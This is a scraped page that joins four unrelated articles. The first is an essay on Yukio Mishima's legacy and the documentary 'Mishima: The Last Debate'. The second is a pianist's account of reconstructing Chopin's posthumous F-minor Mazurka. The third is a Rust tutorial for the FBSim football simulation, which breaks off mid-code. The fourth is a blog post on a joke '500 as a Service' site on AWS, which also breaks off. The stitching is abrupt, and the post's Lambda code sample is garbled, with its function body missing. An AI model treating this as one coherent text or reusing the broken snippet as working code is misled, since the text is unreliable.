<p>Since his shocking suicide, establishment Japan has preferred not to dwell on the “Mishima incident,” and only ultra-rightwing groups have seemed happy to mark the various anniversaries of his death. For the 50th anniversary, though, the vibe has been different. A few days ago, I managed to catch <em>Mishima: The Last Debate</em>, a documentary that uses recently discovered footage of a face-off between Mishima and hundreds of radical students during violent street protests in 1969.</p>
<p>The film was released in March, but was still screening in Tokyo’s central Shibuya district. I half-expected the audience to be dominated by elderly rightists in combat gear. I was wrong. There were women in their 20s and 30s wearing designer masks, some students, ordinary looking couples and solitary intellectual types. Although the film was advertised as a tense confrontation between violence-prone right and violence left-wing groups, the debate was mostly respectful on both sides, with Mishima’s wit drawing gales of laughter from the students and, indeed, the cinema audience.</p>
<p>Other films about Mishima have been made this century. The late Koji Wakamatsu, a radical left sympathizer once known as the “Kurosawa of pink [erotic] movies,” directed <em>11.25: The Day He Chose His Own Fate</em>&nbsp;(2012). This biopic offers a straightforward factual account of Mishima’s last months. There is also a film version of <em>Spring Snow</em>, the first and best volume in his <em>Sea of Fertility</em>&nbsp;tetralogy.</p>
<p>His books are still popular too. Mishima wrote intense, heavyweight novels conveying his philosophical ideas, but also less serious fare as entertainments for the mass market. Interestingly it is the latter that have been doing particularly well these days. A light novel called <em>Yukio Mishima’s Letter Writing Class</em>&nbsp;has consistently ranked in Amazon Japan’s Top 10 for Japanese literature. &nbsp;Another entertainment called <em>Life for Sale</em>&nbsp;was the top seller of 2016 in the Japanese literature department of Kinokuniya, Japan’s largest bookshop, with total sales topping 250,000.</p>
<p><a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-460x345.jpg" alt="Mishima display at Maruzen bookshop (photo: Giles Murray)" width="460" height="345" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-460x345.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-768x576.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-700x525.jpg 700w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-773x580.jpg 773w" sizes="(max-width: 460px) 100vw, 460px"></a> Mishima display at Maruzen bookshop (photo: Giles Murray)
</p><p>At least 30 novels and essays have been translated into English, including <em>Life for Sale</em>. There are also two more biographies. <em>Persona</em>&nbsp;is a meticulously researched doorstopper by Naoki Inose, novelist and ex-governor of Tokyo, and Hiroaki Sato. <em>Yukio Mishima</em>&nbsp;is by British author Damian Flanagan.</p>
<p>Another British Mishima enthusiast was the rock star David Bowie, who appears to have planned his own death in 2016 with Mishima-like artistic precision. Bowie painted a portrait of Mishima, which he hung on the wall of his Berlin apartment in the late 1970s. In the 1990s, he bought a bronze bust of Mishima by British sculptor Sir Eduardo Paolozzi at Sotheby’s.&nbsp; More recently, he referred to the opening of <em>Spring Snow</em>&nbsp;in his 2013 album <em>The Next Day</em>: “Then we saw Mishima’s dog / Trapped between the rocks / Blocking the waterfall.”</p>
<p>The accent on the lighter, more humorous side of Mishima may have contributed to what seems to be a subconscious reassessment within Japan. There is also the fact that some of his political stances — on validating the constitutional status of the Self-Defense Forces, on protecting Japan’s traditional culture — no longer seem extreme.</p>
<p>Another impression came to me forcefully while watching the debate between Mishima and the radical students who were occupying the Tokyo University lecture hall. The cinema audience was agog at the huge moral issues that were being argued in a way that could never happen in today’s world.</p>
<p><a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-460x339.jpg" alt="Mishima engages with student Masahiko Akuta, now a respected theatrical impresario and actor" width="460" height="339" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-460x339.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-768x566.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-700x516.jpg 700w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-787x580.jpg 787w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR.jpg 1447w" sizes="(max-width: 460px) 100vw, 460px"></a> Mishima engages with student Masahiko Akuta, now a respected theatrical impresario and actor
</p><p>In his much-misunderstood book, <em>The End of History and the Last Man</em>,&nbsp; Francis Fukuyama uses the ideas of philosopher Friedrich Nietzsche to speculate about what kind of landscape the post-historical “last men” will inhabit, once liberal democracy has triumphed everywhere. The answer is a world devoid of great art, struggle, risk, wisdom and self-knowledge. The last men, Fukuyama posits, “will be concerned above all for personal health and safety … content to sit at home congratulating themselves on their own broadmindedness and lack of fanaticism.”</p>
<p>Mishima’s dislike of Anglo-Saxon liberal democracy came from Nietzsche. According to Flanagan, “Mishima’s bond with Nietzsche was described by Mishima’s father after his son’s death as of an intensity beyond imagination.”</p>
<p>Mishima committed <em>seppuku</em> just 25 years after the end of World War II, much too soon for him to escape being dismissed as an unbalanced reactionary throwback to the age of militarism. Fifty years on, the last man is here, placidly enjoying his lockdown thanks to Zoom, Netflix and Uber Eats, totally comfortable with the prospect of a future controlled by artificial intelligence and big data.</p>
<p>Perhaps we need a Mishima to shock us out of our complacency.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type="text"><p>If someone had told me a decade ago that I was going to produce the first (and, so far, only) published reconstruction of Chopin's posthumous Mazurka in F Minor that includes every uncanceled measure of the composer's sketch, I would have laughed. But apparently when a performance opportunity inspires a research obsession, unexpected things can happen.</p><p>I'm no piano virtuoso, but for some years I've performed chamber music and solo programs on a church recital series. As a student I learned Fauré's B-Minor Nocturne; Scriabin's Preludes, Op. 74; and Scott Joplin's <em data-redactor-tag="em" data-verified="redactor">Magnetic Rag</em>—each of which is its respective composer's last completed composition for solo piano (and in the case of the latter two, the composer's last completed composition). Eventually I had the idea of performing an entire recital of such works, adding Schubert's Sonata in B-flat, D. 960; Schumann's <em data-redactor-tag="em" data-verified="redactor">Ghost Variations</em>; Brahms's <em data-redactor-tag="em" data-verified="redactor">Klavierstücke</em>, Op. 119; and the piece that is generally considered Chopin's last: the Mazurka in F Minor, Op. 68, No. 4.<br></p><p>Of these last completed piano works, the mazurka was the least finished. Chopin customarily composed at the piano, then notated a sketch, and lastly wrote a fair copy. But for the work published posthumously as Op. 68, No. 4, he only got as far as the sketch, a confusing one-page document that was discovered after his death in 1849.<br></p><p>Virtually all editions of the complete Chopin mazurkas include the same sixty-two-bar A–B–A version published in 1855 by former Chopin copyist Julian Fontana, based on a fair copy by cellist Auguste Franchomme, a close friend of the composer and dedicatee of his Cello Sonata. (The Henle edition exactly follows Franchomme's copy, which is more accurate in several respects than Fontana's published version.) But I was aware of a longer version from pianist Arthur Rubinstein's 1967 RCA recording of the complete Chopin mazurkas—a 1965 reconstruction by Polish pianist-musicologist Jan Ekier that adds a C section in F major. I purchased a copy of this A–B–A–C–A version and assumed I'd play it on my recital.<br></p><p>Looking up the work in Maurice Hinson's <em data-redactor-tag="em" data-verified="redactor">Guide to the Pianist's Repertoire,</em> however, I learned of a more complete 1975 reconstruction by British pianist Ronald Smith as published by Hansen House. It turned out to be out of print, but I tracked down a copy via interlibrary loan. The C section in Smith's A–B–A–C–A version is thirtytwo bars, versus sixteen in Ekier's; in his foreword, Smith specifically criticizes Ekier's version, saying that it "takes a disastrous short-cut in the F major episode."<br></p><p>Wondering whether there had been any other published reconstructions, I of course did a Google search, which led me to "Chopin's Last Style," an article by the eminent Chopin authority Jeffrey Kallberg that appeared in the Summer 1985 issue of the <em data-redactor-tag="em" data-verified="redactor">Journal of the American Musicological Society</em> and was republished with slight emendations as a chapter in his 1996 book <em data-redactor-tag="em" data-verified="redactor">Chopin at the Boundaries: Sex, History, and Musical Genre</em>. Kallberg contends that the piece's form is actually A–B–A–C–A–B–A, which struck me as the solution to one riddle in the sketch— the two different versions of the left hand of the B section's last measure (the second version is printed as an ossia passage in the Ekier and Smith editions). It seems likely that one version of that measure is intended for the first B section, the other for the second B.<br></p><p>Kallberg also provides a detailed summary of the various attempts to reconstruct the piece, which in turn led me to two other versions: an edition by Polish composer-pianist Milosz Magin, published in 1983 by Editions Concertino of Paris, and British pianist John Vallier's 1986 edition (now out of print) of a reconstruction by British musicologist Arthur Hedley, who as the first modern scholar to view the sketch in 1951 had discovered the long-missing C section. The thirty-two-bar C section in Magin's A–B–A–C–A version is structurally identical to Smith's. The form of the Hedley-Vallier version is (as Kallberg proposed) A–B– A–C–A–B–A, with the aforementioned slight variation at the end of the second B; but its final A section is oddly truncated, and the thirty-two-bar C section includes material that is clearly crossed out in the sketch.<br></p><p>In "Chopin's Last Style," Kallberg states that "numerous attempts have been made to decipher the document, none entirely successful." Playing through the four published versions, I couldn't help drawing the same conclusion; I could not see performing any of the four verbatim. So I thought I'd put together a composite version, just for my own personal use, incorporating the most convincing readings from the various editions.<br></p><p>But how does one make those decisions? My own sense of musical style, and of Chopin's style in particular, provided a general basis. Ultimately, though, I had to study the sketch itself, a facsimile of which was printed in several of the published editions.</p><p>One of the first spots I examined was a segment that Kallberg cites as having been omitted in previous reconstructions (Ekier, Magin, and Smith all fail to include it): the bass-clef passage that Chopin labeled 3ci (an abbreviation for <em data-redactor-tag="em" data-verified="redactor">trzeci</em>, Polish for "third"). Kallberg's article interprets this segment as the left hand for the transition to the second B section, and the Hedley- Vallier edition adopts that interpretation as well. I took one look at this passage in the sketch and—to my great surprise—drew a completely different conclusion.</p><p>The passage consists of a quarter note and four eighth notes, connected by an ascending slur (the only slur in the entire sketch) that continues up and to the right of the last note; the beam over the eighth notes also continues up and to the right of the last note. To me, this looked like shorthand for an ascending tonic arpeggio that continues upwards (despite the fact that the last notated pitch is a D-flat, which sounds wrong even if the passage is used as a transition to the second A; Kallberg now conjectures that Chopin intended this note to be a C). And the function of the passage seemed clear to me as well: a little extra flourish to distinguish the final iteration of A as the end of the piece. Indeed, the A section ends three different ways—first leading to B, later leading to C, and finally ending the piece—and Chopin specifically labels this ending the "third." (I find it highly unlikely that the passage represents the second A-to-B transition. My examination of all the Chopin sectional dances—the mazurkas, polonaises, and waltzes—reveals that in A–B– A–C–A–B–A rondos where the first and second B sections are in the same key, the second transition from A to B is always identical to the first.)<br></p><p>But the <em data-redactor-tag="em" data-verified="redactor">3ci </em>passage isn't the only sketch segment that is typically omitted. At the end of the C section, Chopin wrote one measure above the staff in (presumably) treble clef and one measure plus a quarter note below the staff in bass clef. Ekier, Smith, and Magin include the former but omit the latter; Hedley-Vallier includes the latter but omits the former. No previous reconstruction had included every measure of the sketch that Chopin had not crossed out. So I made up my mind that my version would be the first—and this required figuring how to incorporate both these segments at the end of the C section. Thinking more as a composer than as a musicologist, I came up with a solution that seemed to make musical sense.<br></p><p>Barely had I drawn these conclusions than I began to question how I could have solved riddles that had stumped a whole series of eminent Chopin specialists. So first I sent my reconstruction to an esteemed scholar who has dealt extensively with another composer's manuscripts. She was quite encouraging, as were the other editors and teachers I then asked to review my work. Eventually I got up the nerve to send my version to Jeffrey Kallberg himself, who responded, "You've solved a number of puzzling passages that have eluded other researchers, including myself (I'm thinking especially of your very sensible rendition of measure 95 [the end of the C section])." He also generously provided a great deal of critical feedback that led to numerous improvements in both my reconstruction and the accompanying editorial notes.<br></p><p>By this time, I realized that my version might well be of interest to other pianists and scholars, so I began submitting it for publication, and fortunately Richard Walters of Hal Leonard decided to issue it as part of that company's Schirmer Performance Editions series. It appeared in print in 2012—the year after I gave its premiere performance on my last-completed-pianoworks recital.<br></p><p>All music schools try to link performance and scholarship. But sometimes, by pure serendipity, one leads seamlessly to the other—and then back again.<br></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I took a two week vacation in early November. Somehow I decided to spend it learning a bit more about <a href="https://www.rust-lang.org/">Rust</a> and Reinforcement Learning (RL), a sub-field of AI that I haven’t explored much before. We won’t be talking about RL this post, though. That’s for a future blogpost.</p>



<p> All of that lead to me writing <a rel="noreferrer noopener" href="https://github.com/IanTayler/fbsim" target="_blank">FBSim</a><sup>1</sup>, which I struggled to describe as <em>“a game-like football simulation environment for trying out AI ideas, written in Rust</em>“. As a game-dev framework, I used <a href="https://amethyst.rs/">amethyst</a>. Rust, amethyst and FBSim are all open source.</p>



<p>The idea is the following: you write functions defining how each of your players are to behave according to their role (forward, left, right, defender and goalie)<sup>2</sup> and according to the environment, which includes information about the position of every teammate, every opponent, the ball and the net. FBSim does the rest for you.</p>



<p>In Rust terms, all you need to do in order to make your own AI for the game and see it play against other AIs is to implement the <code>Engine</code> <em>trait</em> –a trait is like a <code>protocol</code> in swift, an <code>interface</code> in Go, or an <code>Abstract Base Class</code> in python: essentially, a set of methods–, then you register your engine and change the configuration to make the players use it.</p>



<p>We’ll be implementing a simple AI for FBSim from scratch later on in the blogpost (beginners to Rust are welcome too), but first let me show you how the game looks like.</p>



<p>These are two very simple stock AIs playing each other.</p>



<figure><div>
<p><span><iframe width="1100" height="619" src="https://www.youtube.com/embed/OGKFFvp1zzA?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div><figcaption><code>BasicWingWait</code> <em>detroying </em><code>Basic</code> on a game</figcaption></figure>



<p>Exciting? <em>No? </em>Well… uhh… it’s a bit more exciting if you write the AI yourself.</p>



<p>Let’s go ahead with the implementation.</p>



<h2>Get (to) the sources</h2>



<p>First, let’s download the source code, and checkout the tag for the code that’s compatible with this blogpost.</p>



<pre><code>git clone git@github.com:IanTayler/fbsim.git
cd fbsim
git checkout blogpost-1b # APIs may change in the future!</code></pre>



<h2>Get Rust (if necessary)</h2>



<p>If you have Rust and <code>cargo</code> installed, you’re ready to go ahead. If not, then you should check out <code><a href="https://rustup.rs/">rustup</a></code>. Once you’ve installed <code>rustup</code>, and used it to install the compiler (I’m using 1.47.0) and <code>cargo</code>, you’re good to go.</p>



<p><strong>Note: </strong>FBSim uses <code>const fn</code> with a <code>match</code> statement, so you will need a relatively new version of the Rust compiler. If you’re getting errors mentioning <code>const fn</code> and <code>match</code>, then you probably need to update your compiler to a newer version.</p>



<h2>Build FBSim</h2>



<h3>Linux</h3>



<p>In order for amethyst to work, you should first install some system dependencies, as detailed <a href="https://github.com/amethyst/amethyst#dependencies">here</a>. Install the dependencies according to your distribution and then you can proceed to run the following.</p>


<pre title="">source ./env.sh # necessary due to a rendy bug with vulkan
cargo run
</pre>


<h3>MacOS</h3>



<p>If you’re under macOS, you first need to change the <code>Cargo.toml</code> to use <code>metal</code> instead of <code>vulkan</code>.</p>



<p>Your final Cargo.toml file should look like this:</p>


<pre title="">[package]
name = "fbsim"
version = "0.1.0"
authors = ["Ian Tayler &lt;iangtayler@gmail.com&gt;"]
edition = "2018"
readme = "README.md"
repository = "https://github.com/IanTayler/fbsim/"
license = "MIT"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies.amethyst]
version = "0.15.3"
features = ["metal"]

[dependencies.serde]
version = "1.0.104"

[dependencies]
rand = "0.7.0"
rand_distr = "0.3.0"
</pre>


<p>Now, you can save the file and run:</p>


<pre title="">cargo run
</pre>


<p>I didn’t test this on a mac, so these instructions are based on speculation. Let me know if it doesn’t work for you.</p>



<p><strong>Note: </strong>It was brought to my attention that some people were having <a href="https://github.com/gfx-rs/gfx/issues/2309#issuecomment-506130902">the following issue</a> mentioning <code>gfx-backend-metal</code> and <code>xcrun</code> on macOS. If that’s you, follow the linked issue to get a likely solution.</p>



<h3>Windows</h3>



<p>I think the simple <code>cargo run</code> should work by itself under windows. Let me know if that’s not the case!</p>



<h2>Checking that it works</h2>



<p>If it works, you should see something like the following screenshot. The players should be moving about. Some of them could be standing still. That’s normal.</p>



<figure><a href="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png"><img data-attachment-id="127" data-permalink="https://iantayler.com/2020-11-22_13-57-35/" data-orig-file="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png" data-orig-size="700,724" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020-11-22_13-57-35" data-image-description="" data-medium-file="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=290" data-large-file="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=700" src="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=700" alt="" srcset="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png 700w, https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=145 145w, https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=290 290w" sizes="(max-width: 700px) 100vw, 700px"></a></figure>



<h2>What an FBSim Engine is</h2>



<p>What we’re going to do now is to implement a new <code>Engine</code> and try it out against one of the stock ones.</p>



<p>Implementing an <code>Engine</code> amounts to implementing a bunch of functions that take as input a representation of the state of the game, and output a description of how the agent should behave next frame.</p>



<p>In essence, we’ll be telling our players what to do based on what they can see.</p>



<h3>Engine input</h3>



<p>As input we’ll get an <code>EngineData</code> struct. Here is how it’s defined.</p>


<pre title="">/// Input for engine functions.
pub struct EngineData&lt;'a&gt; {
    pub ball_position: Vector2&lt;f32&gt;,
    pub own_position: Vector2&lt;f32&gt;,
    pub own: &amp;'a player::Player,
    pub own_type: &amp;'a player::PlayerType,
    pub own_net_position: Vector2&lt;f32&gt;,
    pub opponent_net_position: Vector2&lt;f32&gt;,
    pub teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
    pub opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
}

</pre>


<p>If you’re new to Rust. You can ignore the <code>'a</code>. It’s a <a href="https://doc.rust-lang.org/nomicon/lifetimes.html">lifetime</a> parameter. The rest should look somewhat familiar if you’ve used languages like C, C++, Go, etc. All the <code>pub</code>s just mean we want the fields and the struct to be publicly exported. Let’s look at the fields we actually care about.</p>



<p><code>ball_position: Vector2&lt;f32&gt;</code></p>



<p>This will have the <em>absolute</em> position of the ball –(0, 0) is the lower left of the screen–. You can access each coordinate by using <code>Vector2</code>‘s <code>x</code> and <code>y</code> fields. <code>Vector2</code>s also have special methods defined and most operations (<code>+</code>, <code>-</code>, <code>*</code>) behave like you’d expect if you’ve worked with <code>numpy</code> and similar libraries. </p>



<p>The actual <code>Vector2</code> type is defined in the <code><a href="https://docs.rs/nalgebra/0.18.0/nalgebra/">nalgebra</a></code> crate<sup>3</sup>. The <code>&lt;f32&gt;</code> part just means the values in each coordinate are 32bit floats.</p>


<pre title="">own_position: Vector2&lt;f32&gt;,
</pre>


<p>Same as above, but this will have the currently-running player’s position.</p>


<pre title="">own_net_position: Vector2&lt;f32&gt;,
opponent_net_position: Vector2&lt;f32&gt;,
</pre>


<p>You get the idea, right? Positions of the centers of both nets. <code>opponent_net</code> is where <em>you</em> are trying to score. These are also <em>always</em> absolute positions, so they will be the same value every time.</p>


<pre title="">teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
</pre>


<p>Here we have a vector (<code>Vec</code>, similar to C++’s vectors, python’s lists, etc.) having the positions of all your 4 teammates (in the case of <code>teammates_position</code>) or the positions of your 5 opponents (in the case of <code>opponents_position</code>); along with the respective role of each of those opponents or teammates –each element is a pair with role first and position later–. We will not be using these two fields for the rest of this post, but if you plan on implementing a good engine, you probably should.</p>



<h3>Engine output</h3>


<pre title="">/// Return type of engine functions.
pub struct EngineTransition {
    /// Velocity vector (pixels per second). Magnitude will
    /// be cropped to player speed!
    pub velocity: Vector2&lt;f32&gt;,
    /// Which action to activate (if any).
    pub action: Option&lt;player::ActionType&gt;,
}
</pre>


<p>This is what our functions will return. We define our player’s velocity in the x and y axis, and we set the player’s action, if any.</p>



<p>The <code>action</code> field will be either <code>Some(ActionType::Kick)</code> if we want our player to kick the ball if it collides with them next frame and <code>None</code> if we want the player to gently push the ball forward.<sup>4</sup> There are no other actions in this version of FBSim.</p>



<h3>Engine trait (i.e. methods)</h3>


<pre title="">pub trait Engine {
    fn goalie(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn forward(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn left(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn defender(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn right(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn dispatch(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition {
        match engine_data.own_type {
            PlayerType::Goalie =&gt; self.goalie(engine_data),
            PlayerType::Defender =&gt; self.defender(engine_data),
            PlayerType::Forward =&gt; self.forward(engine_data),
            PlayerType::Left =&gt; self.left(engine_data),
            PlayerType::Right =&gt; self.right(engine_data),
        }
    }   
}

</pre>


<p>What this says is we need to implement methods called <code>goalie</code>, <code>defender</code>, <code>left</code>, <code>right</code> and <code>forward</code>. Each will govern how each of our roles play. The <code>dispatch</code> method is already implemented by default, and it’s unlikely you’ll want to change it.</p>



<p>The only difference between roles is the position they start on in the field after each goal and the fact that goalies have a bigger hitbox.</p>



<h3>SimpleEngine trait</h3>



<p>When convenient, you can use <code>SimpleEngine</code>, which only asks that you implement an <code>engine_func</code> method and implements all the <code>Engine</code> methods for you.</p>



<p>This can be useful when you will use exactly the same code for <em>all </em>your roles. You just write that code once in <code>engine_func</code> and <code>SimpleEngine</code> uses it for <code>goalie</code>, <code>left</code>, <code>right</code>, etc. indistinctly.</p>


<pre title="">pub trait SimpleEngine {
    fn engine_func(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
}
</pre>


<p>This is what we’ll be using. But you’ll likely want to have different methods for your different roles if you implement something more complex.</p>



<h2>Implementation</h2>



<h3>Minimal Engine implementation</h3>



<p>We’ll create a file <code>src/engines/myengine.rs</code>. That’s where our entire engine will live.</p>



<p>We’ll first create the silliest engine possible: we’ll always stay put and not do any actions. Later we’ll make a less silly engine.</p>


<pre title="">// src/engines/myengine.rs
//
// First import everything we need.
// "crate" are imports relative to our own code.
// So crate::components is under src/components, for example.
use crate::{        
    components::player::ActionType,
    engines::{EngineData, EngineTransition, SimpleEngine},
};                      
                    
// We don't need any fields. We just define an empty struct.
pub struct MyEngine;    

// We use `impl` to implement the `SimpleEngine` trait.
impl SimpleEngine for MyEngine {
    fn engine_func(&amp;mu…</pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>A few days ago I built a new website, though calling it such might be a touch too generous. It’s called <em>500 as a Service</em> or <em>500aaS</em> for short. You can visit it on <a href="https://500asaservice.com/">500asaservice.com</a>. Don’t sue me if you find it disappointing. It’s meant to be a failure after all.</p> <p>I figured, with the wealth of things available to consume as a service nowadays, it felt just appropriate to altruistically offer a piece of failure on-demand, free of charge, to my fellow humans. I know, I may have probably peaked with this idea right here.</p> <p>Take it for what you may, but I probably got more out of building this website than you, dear reader, after contemplating it in befuddlement. I didn’t set out to build a lazy failure, mind you. I wanted to build a massively scalable one. And this poses a somewhat more interesting challenge. How did I do it?</p>  <p>The vision for 500aaS is as follows:</p> <blockquote> <p>Provide a planet-scale, elastic, resilient, secure and low-latency on-demand HTTP 500 service.</p> </blockquote> <p>Planet-scale, elastic… those couple of buzzword bingo entries hint at a cloud service… AWS maybe? Correct! (it was the <em>elastic</em> part that gave it away, wasn’t it?). In times past, the simplest way to deploy a site like this would’ve been to get hold of a server box somewhere, set up Apache or Nginx on it and configure the web server to always return 500 errors, regardless of the URL pattern it receives. Open this server up to the public Internet via a static IP address and voila: you got yourself a homemade failure.</p> <div><div><pre><code># Minimal nginx config that will get you 500 responses forever
# /etc/nginx.conf
events {}

http {
    server {
        location / {
            return 500;
        }
    }
}
</code></pre></div></div> <p>But there is a big caveat here. This is just one physical server we’re talking about. What if 500aaS took off big time and people started swarming onto my site, anxiously seeking their daily fix of foobar? The server could become overwhelmed, unable to even muster the processing power to serve a <em>faux</em> HTTP 500, and start returning real ones, if at all. You could argue this is technically still OK, as the whole point of 500aaS is to fail, but I’m a bit of a purist, so I coudn’t accept that possibility. The question remains then: how do I deploy a service like this so that it can serve endless botched responses in a controlled manner, to anyone, under any circumstances? By taking it to the cloud, of course!</p> <p>The easiest, most scalable way to host a site on AWS is to build it on top of their serverless stack: Lambda, DynamoDB… My application doesn’t need any state to remember it should be always serving a 500 response back so all I need is a simple Lambda function to run it. One like this maybe:</p> <div><div><pre><code><span>const</span> <span>fs</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>fs</span><span>'</span><span>);</span>

        &lt;p&gt;There was an error processing your request.&lt;/p&gt;

    <span>return</span> <span>response</span><span>;</span>
<span>};</span>
</code></pre></div></div> <p>I want to return an error with the minimum amount of complexity and effort possible. Turns out it’s actually pretty hard to cause a Lambda function to truly crash, so I manually craft the 500 status codes instead. Is this cheating? Maybe, but it’s not like a user of this service would care. They just want to see a 500 error page, for God’s sake!</p> <p>Despite the simplicity of its implementation, this approach would still require me setting up an API Gateway as a frontend, which is good but not very cheap in the long run, and not entirely hassle-free. There is another option, and that is to serve the content as close as possible to the location it was requested from, and generating said response directly where it’s served. Does this sound like I’m talking about a CDN? Because that’s exactly what I’m talking about.</p> <p>If you’ve never come across this approach before, several cloud vendors and CDN providers let you ship your code directly to the servers at their edge points of presence, which means the client-server exchange journey is remarkably shortened. Instead of having the CDN as the middle-man that caches the content served from the actual web servers, the CDN now becomes <strong>the</strong> server. Wait a minute, aren’t CDNs just dumb caches serving static Internet files all over the planet? Well, not anymore! You can now run arbitrary code in them too which allows them to modify Internet payloads running through them on the fly, as well as generating new content dynamically!</p> <p>The first major vendor I know of that started offering this were Cloudflare, with <a href="https://workers.cloudflare.com/">Cloudflare Workers</a>. Workers have evolved a fair bit as a technology since they were first launched a few years ago. You can deploy pretty useful applications straight to their CDN using JavaScript or WASM, which unlocks Rust and even COBOL! The <a href="https://developers.cloudflare.com/workers/about/how-it-works/">technology</a> that enables this is pretty interesting but beyond the scope of this article. Anyway, getting started with Cloudflare Workers is fairly easy nowadays. Here’s a sample Worker JS script I put together:</p> <div><div><pre><code><span>addEventListener</span><span>(</span><span>'</span><span>fetch</span><span>'</span><span>,</span> <span>event</span> <span>=&gt;</span> <span>{</span>
  <span>event</span><span>.</span><span>respondWith</span><span>(</span><span>handleRequest</span><span>(</span><span>event</span><span>.</span><span>request</span><span>));</span>
<span>});</span>
<span>/**
 * Respond with HTTP 500
 * @param {Request} request
 */</span>
<span>async</span> <span>function</span> <span>handleRequest</span><span>(</span><span>request</span><span>)</span> <span>{</span>
  <span>const</span> <span>htmlBody</span> <span>=</span> <span>`
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;500 - Internal Server Error&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;500&lt;/h1&gt;
        &lt;h2&gt;Internal Server Error&lt;/h2&gt;
    &lt;/body&gt;
&lt;/html&gt;
`</span><span>;</span>
  <span>return</span> <span>new</span> <span>Response</span><span>(</span><span>htmlBody</span><span>,</span> <span>{</span>
    <span>status</span><span>:</span> <span>500</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>'</span><span>content-type</span><span>'</span><span>:</span> <span>'</span><span>text/html</span><span>'</span> <span>},</span>
  <span>});</span>
<span>}</span>
</code></pre></div></div> <p>Deploying it was easy too. The problem came shortly after when I tried to add my new Worker URL to my AWS Route53 DNS records so that I could use the 500asaservice.com domain for it. The bad news is that Cloudflare won’t allow you to do this, unless you pay them a shed load of money. So that was the end of my adventure with Cloudflare Workers. At this point I decided to return to AWS to see what they could do for me. And easy enough, they have something pretty similar to Cloudflare Workers. It’s called Lambda@Edge and it allows you to run Lambda functions within CloudFront itself.</p> <p>With barely no changes to my original Lambda code, I set up a new CloudFront distribution. The origin for the distribution is inconsequential since every single response will be generated within the Lambda so I just gave it a made-up one. Then, all I had to do was to set up a CloudFront <code>viewer-request</code> event as the trigger for my Lambda and deploy the distribution. Once I got everything working, I encoded the configuration in a <code>serverless.yml</code> so it was easier to change and deploy. And that was pretty much it. I now have a Lambda function which runs atop Amazon’s ubiquitous and nearly infallible CDN. It costs me almost nothing to run it (provided it doesn’t start serving huge amounts of traffic) and requires no maintenance at all. I’m so confident of the performance and uptime (downtime?) of my application that I even published <a href="https://github.com/dvejmz/500aas#sla">an SLA for it</a>.</p> <p>There are still a couple of bugs in my application. Excuse me, bugs in an app that was built to fail? Yup, it turns out, 500aaS does not always return a HTTP 500 status code. It can still be susceptible to malformed HTTP requests, which will force CloudFront to step in and return a HTTP 400 error instead, bypassing the Lambda altogether (this is why my SLA does not promise 100% downtime). This is something I could perhaps fix by overriding the custom error responses CloudFront returns, but they seem to be set up as a function of the origin response, so I don’t know if they would work with Lambda@Edge. Still a work in progress.</p> <p>If you’re interested in checking out how 500aaS was built, you can browse the <a href="https://github.com/dvejmz/500aas">repository on GitHub</a>. Pull requests and suggestions welcome. I even set up a GitHub Actions pipeline to 